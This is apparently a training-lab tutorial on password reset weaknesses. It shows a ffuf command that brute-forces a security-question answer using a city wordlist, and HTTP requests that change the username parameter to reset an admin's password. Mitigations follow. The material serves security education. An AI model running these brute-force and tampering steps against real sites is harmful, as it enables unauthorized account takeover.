# Vulnerable Password Reset

We have already discussed how to brute-force password reset tokens to gain access to a victim's account. However, even if a web application utilizes rate limiting and CAPTCHAs, business logic bugs within the password reset functionality can still allow for the takeover of other users' accounts.

## Guessable Password Reset Questions

Often, web applications authenticate users who have lost their passwords by requiring them to answer one or more security questions. During registration, users provide answers to predefined and generic security questions, disallowing users from entering custom ones. Therefore, within the same web application, the security questions of all users will be the same, allowing attackers to abuse them.

### Exploitation Approach

Assuming we had found such functionality on a target website, we should attempt to exploit it to bypass authentication. Often, the weak link in a question-based password reset functionality is the predictability of the answers.

**Common vulnerable questions:**
- "What is your mother's maiden name?"
- "What city were you born in?"

These questions can often be obtained through OSINT or guessed with sufficient attempts due to lack of brute-force protection.

### Brute-forcing Security Answers

For a question like "What city were you born in?", we can use a wordlist of cities worldwide. A CSV file with 25,000+ cities is a great starting point.

**Creating a city wordlist:**
```bash
cat world-cities.csv | cut -d ',' -f1 > city_wordlist.txt
wc -l city_wordlist.txt  # 26468 city_wordlist.txt
```

**Targeting a user:**
1. Navigate to the reset page and specify the target username (e.g., `admin`)
2. Brute-force the security question answer using ffuf:

```bash
ffuf -w ./city_wordlist.txt -u http://pwreset.htb/security_question.php \
    -X POST \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -b "PHPSESSID=39b54j201u3rhu4tab1pvdb4pv" \
    -d "security_response=FUZZ" \
    -fr "Incorrect response."
```

Once the correct answer is found (e.g., `Houston`), proceed to reset the password.

**Optimization with OSINT:**
If you know the target's country, filter the wordlist to reduce attempts:
```bash
cat world-cities.csv | grep Germany | cut -d ',' -f1 > german_cities.txt
wc -l german_cities.txt  # 1117 german_cities.txt
```

## Manipulating the Reset Request

Another flaw occurs when users can manipulate hidden parameters to reset other accounts' passwords.

### Vulnerable Flow Example

**Step 1: Specify username**
```http
POST /reset.php HTTP/1.1
Host: pwreset.htb
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=39b54j201u3rhu4tab1pvdb4pv

username=htb-stdnt
```

**Step 2: Answer security question**
```http
POST /security_question.php HTTP/1.1
Host: pwreset.htb
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=39b54j201u3rhu4tab1pvdb4pv

security_response=London&username=htb-stdnt
```

**Step 3: Reset password**
```http
POST /reset_password.php HTTP/1.1
Host: pwreset.htb
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=39b54j201u3rhu4tab1pvdb4pv

password=P@$$w0rd&username=htb-stdnt
```

### Exploitation

If the application doesn't verify that usernames match across all requests, an attacker can manipulate the `username` parameter in the final request to reset a different user's password:

```http
POST /reset_password.php HTTP/1.1
Host: pwreset.htb
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=39b54j201u3rhu4tab1pvdb4pv

password=P@$$w0rd&username=admin
```

This bypasses the security question entirely.

## Mitigation

To prevent these vulnerabilities:
- Maintain consistent state throughout the entire password reset process
- Verify that the username remains the same across all steps
- Implement proper validation and brute-force protection
- Regularly audit password reset functionality for logic flaws
